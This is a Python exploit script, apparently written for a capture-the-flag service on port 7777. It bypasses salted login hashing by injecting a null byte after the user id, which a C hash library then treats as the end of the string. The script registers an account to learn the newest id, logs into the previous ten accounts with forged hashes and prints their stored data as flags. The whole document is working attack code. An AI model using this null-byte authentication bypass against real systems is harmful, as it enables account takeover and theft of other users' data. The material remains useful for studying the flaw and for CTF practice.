#!/usr/bin/python3
# This exploit injects zero byte after id in login attempt to ignore salt
# in hash calculation. This works, because you can push zero bytes in
# std::string and next characters will be put after it. However the hash_lib is
# written in C and receives char*.

import sys
import hashlib
import socket
import time

def get_hash(user_id):
  sha = hashlib.sha256()
  sha.update(str(user_id).encode('ascii'))
  return sha.hexdigest()[:32]


ip = sys.argv[1]
PORT = 7777
RECV_TIME = 0.1

# Registering a new user to get last user_id
sock = socket.socket()
sock.connect((ip, PORT))
time.sleep(RECV_TIME)
sock.recv(4096)
sock.send('register\n'.encode('ascii'))
time.sleep(RECV_TIME)
data = sock.recv(4096).decode('ascii')
sock.close()
id = data[data.find('id =')+4:]
id = id[:id.find('\n')].strip()
id = int(id)
for i in range(id-1, max(1, id - 11), -1):
  sock = socket.socket()
  sock.connect((ip, PORT))
  time.sleep(RECV_TIME)
  sock.recv(4096)
  # Adding zero byte after id
  id_str = '%d\0'%i
  sock.send(('login\n%s\n%s\n' % (id_str, get_hash(i))).encode('ascii'))
  time.sleep(RECV_TIME)
  if not 'Login completed' in sock.recv(4096).decode('ascii'):
    # Something went wrong.
    print('wat')
    sock.close()
    continue
  sock.send(('get_data\n%d\n' % i).encode('ascii'))
  time.sleep(RECV_TIME)
  # Flags will be somewhere in stdout.
  print(sock.recv(4096).decode('ascii'))
  sock.close()
